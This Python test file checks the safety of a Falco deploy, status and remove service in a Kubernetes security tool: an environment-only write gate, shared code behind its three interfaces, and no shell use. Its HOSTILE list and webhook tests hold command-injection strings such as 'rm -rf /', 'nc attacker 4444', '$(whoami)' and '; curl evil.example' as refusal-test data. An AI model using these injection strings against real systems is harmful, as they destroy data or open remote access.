"""
Falco lifecycle: one service, three front doors, one write gate.

Deploying Falco is the only thing this project does that changes a cluster, so it is the
one place where "the CLI and the UI and the assistant each grew their own version" would be
a security bug rather than a maintenance annoyance. These tests hold the shape:

  * MCP, CLI and the web API all call core/falco_lifecycle and nothing else;
  * nothing mutates a cluster unless K8SMATRIXWARDEN_ALLOW_CLUSTER_WRITE=1, read from the
    environment and never from an argument a caller controls;
  * no shell is ever invoked, and the chart is not a parameter;
  * `unknown` (we could not look) stays distinct from `not-installed` (we looked).

The gate is closed for every test here, so nothing touches a real cluster.
"""
import inspect
import json
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from k8smatrixwarden.agents.scanner import ScannerAgent
from k8smatrixwarden.bootstrap import build_platform
from k8smatrixwarden.core import falco_lifecycle as falco
from k8smatrixwarden.core.models import ScanRequest
from k8smatrixwarden.core.report_store import ReportStore
from k8smatrixwarden.mcp.server import build_tools
from k8smatrixwarden.web.app import WebApp

TOOLS = build_tools()


def _gate_closed():
    return os.environ.get(falco.WRITE_GATE) != "1"


def _app():
    platform = build_platform()
    directory = tempfile.mkdtemp()
    store = ReportStore(directory)
    store.save(ScannerAgent(platform).scan(ScanRequest(),
                                           platform.make_collector(mock=True)))
    return WebApp(platform, reports_dir=directory)


# --------------------------------------------------------------------------- #
# The write gate
# --------------------------------------------------------------------------- #

def test_the_gate_is_closed_by_default():
    assert _gate_closed(), "the test environment must not have cluster writes enabled"
    assert falco.writes_allowed() is False


def test_deploy_changes_nothing_while_the_gate_is_closed():
    out = falco.deploy("http://127.0.0.1:8080/api/runtime")
    assert out["status"] == "dry-run"
    assert out["writes_allowed"] is False
    assert falco.WRITE_GATE in out["error"]
    # It must still say what it WOULD do, or the refusal is useless.
    assert any("helm install" in c for c in out["commands"])


def test_remove_changes_nothing_while_the_gate_is_closed():
    out = falco.remove()
    assert out["status"] == "dry-run"
    assert out["commands"] == ["helm uninstall falco -n falco"]


def test_the_gate_cannot_be_opened_by_an_argument():
    """It is read from the environment. A tool parameter that enabled cluster writes would
    let the caller grant itself the permission the gate exists to withhold."""
    for fn in (falco.deploy, falco.remove, falco.status):
        params = set(inspect.signature(fn).parameters)
        assert not params & {"allow_write", "force", "write", "allow_cluster_write",
                             "confirm"}, f"{fn.__name__} exposes a gate-like parameter"
    assert "os.environ" in inspect.getsource(falco.writes_allowed)


def test_status_needs_no_gate_because_it_only_reads():
    out = falco.status()
    assert "error" not in out or "write" not in out.get("error", "").lower()
    assert out["state"] in (falco.NOT_INSTALLED, falco.RUNNING, falco.DEGRADED,
                            falco.FAILED, falco.UNKNOWN)


# --------------------------------------------------------------------------- #
# Input validation: nothing reaches an argv list unchecked
# --------------------------------------------------------------------------- #

HOSTILE = [
    "falco; rm -rf /", "falco && kubectl delete ns kube-system", "$(whoami)",
    "`id`", "falco|nc attacker 4444", "../../etc", "FALCO", "falco_bad",
    "-n kube-system", "--set foo=bar", "a" * 64, "", "kube system",
]


def test_hostile_namespaces_and_releases_are_refused():
    for evil in HOSTILE:
        for out in (falco.status(namespace=evil),
                    falco.status(release=evil),
                    falco.deploy("http://x/y", namespace=evil),
                    falco.remove(namespace=evil)):
            assert "error" in out, f"{evil!r} was accepted"
            assert "invalid" in out["error"].lower()


def test_a_non_http_webhook_is_refused():
    for bad in ("file:///etc/passwd", "javascript:alert(1)", "", "ftp://x/y",
                "; curl evil.example", None, 42):
        out = falco.deploy(bad)
        assert out["status"] == "error" and "webhook_url" in out["error"]


def test_the_chart_and_repository_are_not_parameters():
    """Choosing the chart is choosing what runs in the cluster. That is the same
    capability as arbitrary execution, so it is a constant."""
    for fn in (falco.deploy, falco.remove):
        params = set(inspect.signature(fn).parameters)
        assert not params & {"chart", "repo", "repository", "repo_url", "values",
                             "set", "extra_args", "helm_args", "version"}
    assert falco.CHART == "falcosecurity/falco"


def test_no_shell_is_ever_invoked():
    """Checked on the parsed code, not the text: the module's own docstring says
    `shell=True` appears nowhere, and a substring search would match that sentence."""
    import ast
    tree = ast.parse(inspect.getsource(falco))
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            for kw in node.keywords:
                assert kw.arg != "shell" or not getattr(kw.value, "value", False),                     "a subprocess call passes shell=True"
            name = getattr(getattr(node.func, "value", None), "id", "")
            attr = getattr(node.func, "attr", "")
            if name == "os" and attr == "system":
                raise AssertionError("os.system is called")
            # Every process call passes a LIST, never a joined string a shell would parse.
            if (name, attr) == ("subprocess", "run"):
                assert node.args and isinstance(node.args[0], (ast.List, ast.Starred)),                     "subprocess.run must be given an argument list"


def test_removal_never_deletes_the_namespace():
    """A cleanup that takes the namespace with it takes whatever else lived there."""
    source = inspect.getsource(falco.remove)
    assert "delete" not in source.replace("deleted", "").replace("deletes", "").lower() \
        or "namespace" not in source.split("helm")[0].lower()
    assert "uninstall" in source
    out = falco.remove()
    assert "delete namespace" not in json.dumps(out)


# --------------------------------------------------------------------------- #
# One implementation behind three surfaces
# --------------------------------------------------------------------------- #

def test_mcp_tools_delegate_to_the_service():
    for tool, fn in (("deploy_falco", "deploy"), ("get_falco_status", "status"),
                     ("remove_falco", "remove")):
        source = inspect.getsource(TOOLS[tool])
        assert "falco_lifecycle" in source, f"{tool} does not use the shared service"
        assert f"import {fn}" in source or f"{fn}(" in source


def test_the_cli_delegates_to_the_service():
    from k8smatrixwarden.cli.main import cmd_falco
    source = inspect.getsource(cmd_falco)
    assert "falco_lifecycle" in source
    assert "subprocess" not in source, "the CLI must not run helm itself"


def test_the_web_api_delegates_to_the_service():
    source = inspect.getsource(WebApp._api_falco)
    assert "falco_lifecycle" in source
    assert "subprocess" not in source and "helm" not in source.replace("helm invocation",
                                                                       "")


def test_the_browser_never_builds_a_helm_command():
    page = _app().route("GET", "/runtime").text
    assert "/api/falco/" in page, "the page must call the API"
    assert "helm install" not in page and "helm uninstall" not in page


def test_all_three_surfaces_agree_while_the_gate_is_closed():
    direct = falco.deploy("http://127.0.0.1:8080/api/runtime")
    over_mcp = TOOLS["deploy_falco"](webhook_url="http://127.0.0.1:8080/api/runtime")
    response = _app().route("POST", "/api/falco/deploy", body=json.dumps(
        {"webhook_url": "http://127.0.0.1:8080/api/runtime"}).encode())
    over_web = json.loads(response.text)
    assert direct["status"] == over_mcp["status"] == over_web["status"] == "dry-run"
    assert direct["commands"] == over_mcp["commands"] == over_web["commands"]


# --------------------------------------------------------------------------- #
# Surfaces are registered and answer
# --------------------------------------------------------------------------- #

def test_the_three_falco_tools_are_registered():
    for name in ("deploy_falco", "get_falco_status", "remove_falco"):
        assert name in TOOLS


def test_the_cli_has_a_falco_command_with_three_subcommands():
    from k8smatrixwarden.cli.main import build_parser
    parser = build_parser()
    sub = next(a for a in parser._actions
               if hasattr(a, "choices") and a.choices and "scan" in a.choices)
    assert "falco" in sub.choices
    nested = next(a for a in sub.choices["falco"]._actions
                  if hasattr(a, "choices") and a.choices)
    assert set(nested.choices) == {"status", "deploy", "remove"}
    # build_parser must still return the TOP-level parser: a subparser variable that
    # shadowed it once made this function return the wrong object and broke every command.
    assert parser.prog == "k8smatrixwarden"


def test_the_web_endpoints_answer():
    app = _app()
    status = app.route("GET", "/api/falco/status")
    assert status.status == 200
    assert json.loads(status.text)["state"] in (
        falco.NOT_INSTALLED, falco.RUNNING, falco.DEGRADED, falco.FAILED, falco.UNKNOWN)
    for action in ("deploy", "remove"):
        out = app.route("POST", f"/api/falco/{action}", body=b"{}")
        assert out.status == 200
        assert json.loads(out.text)["status"] == "dry-run"


def test_a_malformed_web_body_is_a_400_not_a_traceback():
    out = _app().route("POST", "/api/falco/deploy", body=b"{not json")
    assert out.status == 400
    assert "Traceback" not in out.text


# --------------------------------------------------------------------------- #
# Honest states
# --------------------------------------------------------------------------- #

def test_unknown_is_not_the_same_as_not_installed():
    """"We could not look" and "we looked and it is absent" are different answers, and
    conflating them is how a broken connection reads as a clean cluster."""
    out = falco.status()
    if out["state"] == falco.UNKNOWN:
        assert out.get("error") or out.get("message"), \
            "unknown must always say why it is unknown"
    assert falco.UNKNOWN != falco.NOT_INSTALLED


def test_every_state_is_one_of_the_documented_values():
    documented = {falco.NOT_INSTALLED, falco.RUNNING, falco.DEGRADED, falco.FAILED,
                  falco.UNKNOWN}
    assert falco.status()["state"] in documented
    assert len(documented) == 5


if __name__ == "__main__":
    import traceback
    failed = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn()
            except Exception:
                failed += 1
                print(f"FAIL {name}")
                traceback.print_exc()
    print("ok" if not failed else f"{failed} failed")
